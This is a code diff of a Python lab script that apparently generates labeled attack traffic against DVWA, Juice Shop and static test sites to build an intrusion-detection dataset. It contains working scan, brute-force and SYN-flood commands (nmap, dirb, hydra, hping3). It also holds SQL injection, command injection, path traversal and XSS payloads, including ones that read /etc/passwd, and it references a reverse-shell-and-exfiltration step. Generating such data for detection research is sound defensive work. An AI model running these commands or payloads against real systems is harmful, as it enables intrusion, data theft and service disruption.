@@ -52,17 +52,21 @@ def now():
     return datetime.now(timezone.utc).isoformat(timespec="milliseconds")
 
 
-def log(site, label, phase, t0, t1, code):
+def log(site, label, phase, t0, t1, code, outcome):
+    # outcome: benign | attack | attempt | success
+    #   attack  = scan/brute/flood (network attack, no compromise notion)
+    #   attempt = exploit tried but target not compromised (e.g. static site)
+    #   success = exploit compromised the target (e.g. DVWA)
     with _lock:
         new = not os.path.exists(LOG)
         os.makedirs(os.path.dirname(LOG), exist_ok=True)
         with open(LOG, "a", newline="") as f:
             w = csv.writer(f)
             if new:
-                w.writerow(["student", "phase", "label", "site_id", "site_name",
-                            "sector", "src_ip", "dst_ip", "start_utc", "end_utc",
-                            "exit_code"])
-            w.writerow([STUDENT, phase, label, site["id"], site["name"],
+                w.writerow(["student", "phase", "label", "outcome", "site_id",
+                            "site_name", "sector", "src_ip", "dst_ip",
+                            "start_utc", "end_utc", "exit_code"])
+            w.writerow([STUDENT, phase, label, outcome, site["id"], site["name"],
                         site["sector"], SRC_IP, site["ip"], t0, t1, code])
 
 
@@ -119,7 +123,7 @@ def normal_burst(sites, rnd):
                  "-A", "Mozilla/5.0 (FL-Lab normal user)", base + path], timeout=10)
         time.sleep(rnd.uniform(0.5, 3.0))
     for site in statics:
-        log(site, "benign", "normal", t0, now(), 0)
+        log(site, "benign", "normal", t0, now(), 0, "benign")
 
 
 # ---------------------------------------------------------- network attacks -
@@ -132,14 +136,19 @@ def attack_cmds(site):
     base = f"http://{ip}:{port}"
     return {
         "portscan":      (["nmap", "-sS", "-T3", "-p", "1-10000", ip], 300),
-        "web_scan":      (["nikto", "-h", base, "-maxtime", "150s"], 240),
-        "dir_bruteforce":(["gobuster", "dir", "-u", base,
-                           "-w", DIRS, "-q", "-t", "20"], 180),
+        # Web-layer scan via nmap HTTP NSE scripts (enumeration + probes).
+        # Uses the already-installed nmap, so no extra toolbox dependency.
+        "web_scan":      (["nmap", "-Pn", "-p", str(port), "--script",
+                           "http-enum,http-headers,http-title,http-methods,"
+                           "http-sql-injection", ip], 300),
+        "dir_bruteforce":(["dirb", f"{base}/", DIRS, "-S", "-r"], 180),
         "login_bruteforce":(["hydra", "-s", str(port), "-L", USERS, "-P",
                              PASSWORDS, "-t", "4", ip, "http-post-form",
                              f"{login_path}:username=^USER^&password=^PASS^:{fail}"], 240),
-        "syn_flood":     (["timeout", "45", "hping3", "-S", "-p", str(port),
-                           "-i", "u3000", ip], 60),
+        # shorter, lower-rate flood so it doesn't swamp the flow dataset
+        # (a flood still produces far more flows than other attacks)
+        "syn_flood":     (["timeout", "20", "hping3", "-S", "-p", str(port),
+                           "-i", "u6000", ip], 35),
     }
 
 
@@ -149,11 +158,13 @@ def attack_phase(sites, rnd):
     print(f"{STUDENT}: attacking {[t['id'] for t in targets]}", flush=True)
     for site in targets:
         cmds = attack_cmds(site)
-        for name in rnd.sample(sorted(cmds), k=rnd.randint(2, 4)):
+        for idx, name in enumerate(rnd.sample(sorted(cmds), k=rnd.randint(2, 4))):
+            if idx:
+                time.sleep(rnd.uniform(10, 16))   # gap so windows don't overlap
             cmd, tmo = cmds[name]
             t0 = now()
             code = run(cmd, timeout=tmo + 30)
-            log(site, name, "attack", t0, now(), code)
+            log(site, name, "attack", t0, now(), code, "attack")
             if read_phase() != "attack":
                 return
 
@@ -242,9 +253,9 @@ def exploit_dvwa(site, rnd):
         http_post(op, base + "/login.php",
                   {"username": "admin", "password": "password",
                    "Login": "Login", "user_token": tok})
-        log(site, "login_success", "exploit", t0, now(), 0)
+        log(site, "login_success", "exploit", t0, now(), 0, "success")
     except Exception:
-        log(site, "login_success", "exploit", now(), now(), -2)
+        log(site, "login_success", "exploit", now(), now(), -2, "attempt")
         return
     # force security level low via cookie
     cj.set_cookie(http.cookiejar.Cookie(
@@ -252,6 +263,7 @@ def exploit_dvwa(site, rnd):
         False, None, True, None, None, {}))
 
     # 2) SQL injection (dumps all users)
+    time.sleep(5)                                  # separate windows
     t0 = now()
     try:
         payload = urllib.parse.quote("1' OR '1'='1")
@@ -259,9 +271,10 @@ def exploit_dvwa(site, rnd):
         code = 0
     except Exception:
         code = -2
-    log(site, "sqli", "exploit", t0, now(), code)
+    log(site, "sqli", "exploit", t0, now(), code, "success" if code == 0 else "attempt")
 
     # 3) command injection (benign proof: read /etc/passwd)
+    time.sleep(5)
     t0 = now()
     try:
         tok = _dvwa_token(op, base + "/vulnerabilities/exec/")
@@ -271,9 +284,11 @@ def exploit_dvwa(site, rnd):
         code = 0
     except Exception:
         code = -2
-    log(site, "cmd_injection", "exploit", t0, now(), code)
+    log(site, "cmd_injection", "exploit", t0, now(), code,
+        "success" if code == 0 else "attempt")
 
     # 4) reverse shell + exfil (post-exploitation)
+    time.sleep(5)
     result = {}
     lst = threading.Thread(target=_shell_listener, args=(result,), daemon=True)
     lst.start()
@@ -290,9 +305,9 @@ def exploit_dvwa(site, rnd):
     lst.join(timeout=70)
     if result.get("t0"):
         log(site, "reverse_shell", "exploit",
-            result["t0"], result.get("t1", now()), 0)
+            result["t0"], result.get("t1", now()), 0, "success")
     else:
-        log(site, "reverse_shell", "exploit", now(), now(), -1)
+        log(site, "reverse_shell", "exploit", now(), now(), -1, "attempt")
 
 
 # ------------------------------------------------- exploits: Juice Shop ------
@@ -310,7 +325,7 @@ def exploit_juiceshop(site, rnd):
         code = 0                     # 401 still means the injection was attempted
     except Exception:
         code = -2
-    log(site, "sqli", "exploit", t0, now(), code)
+    log(site, "sqli", "exploit", t0, now(), code, "success" if code == 0 else "attempt")
     # product search union-based injection (error/union traffic)
     t0 = now()
     try:
@@ -319,21 +334,63 @@ def exploit_juiceshop(site, rnd):
         code = 0
     except Exception:
         code = -2
-    log(site, "sqli", "exploit", t0, now(), code)
+    log(site, "sqli", "exploit", t0, now(), code, "success" if code == 0 else "attempt")
+
+
+# ------------------------------------ exploit ATTEMPTS on normal sites ------
+# A real attacker sprays web-exploit payloads at EVERY site, not just the
+# vulnerable one. Against the static company sites these never compromise
+# anything (outcome="attempt"), but the malicious request traffic is real and
+# must be labeled -- and it gives every organization exploit-class samples.
+_ATTEMPT_PAYLOADS = {
+    "sqli": ["/?id=1%27%20OR%20%271%27=%271",
+             "/?q=1%27%20UNION%20SELECT%20NULL,NULL--",
+             "/login?username=admin%27--&password=x"],
+    "cmd_injection": ["/?cmd=;id", "/?host=127.0.0.1;cat%20/etc/passwd",
+                      "/?ping=127.0.0.1|whoami"],
+    "path_traversal": ["/?file=../../../../etc/passwd",
+                       "/..%2f..%2f..%2f..%2fetc%2fpasswd",
+                       "/?page=....//....//etc/passwd"],
+    "xss": ["/?q=%3Cscript%3Ealert(1)%3C/script%3E",
+            "/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E"],
+}
+
+
+def web_exploit_attempts(site, rnd):
+    base = f"http://{site['ip']}:{site.get('port', 80)}"
+    op, _ = opener()
+    for idx, name in enumerate(rnd.sample(sorted(_ATTEMPT_PAYLOADS), k=rnd.randint(2, 4))):
+        if idx:
+            time.sleep(rnd.uniform(6, 10))         # separate windows
+        t0 = now()
+        for path in _ATTEMPT_PAYLOADS[name]:
+            for _ in range(rnd.randint(2, 4)):
+                try:
+                    http_get(op, base + path, timeout=6)
+                except Exception:
+                    pass
+        log(site, name, "exploit", t0, now(), 0, "attempt")
+        if read_phase() != "exploit":
+            return
 
 
 def exploit_phase(sites, rnd):
     vulns = [s for s in sites if s.get("type", "static") != "static"]
-    if not vulns:
-        print(f"{STUDENT}: no vulnerable apps assigned", flush=True)
-        return
-    print(f"{STUDENT}: exploiting {[v['id'] for v in vulns]}", flush=True)
+    statics = [s for s in sites if s.get("type", "static") == "static"]
+    print(f"{STUDENT}: exploiting vuln={[v['id'] for v in vulns]} "
+          f"attempts={[s['id'] for s in statics]}", flush=True)
+    # real, succeeding exploits against the vulnerable apps
     for site in vulns:
         kind = site.get("type")
         if kind == "dvwa":
             exploit_dvwa(site, rnd)
         elif kind == "juiceshop":
             exploit_juiceshop(site, rnd)
+        if read_phase() != "exploit":
+            return
+    # failed exploit attempts against every static company site
+    for site in statics:
+        web_exploit_attempts(site, rnd)
         if read_phase() != "exploit":
             return
 
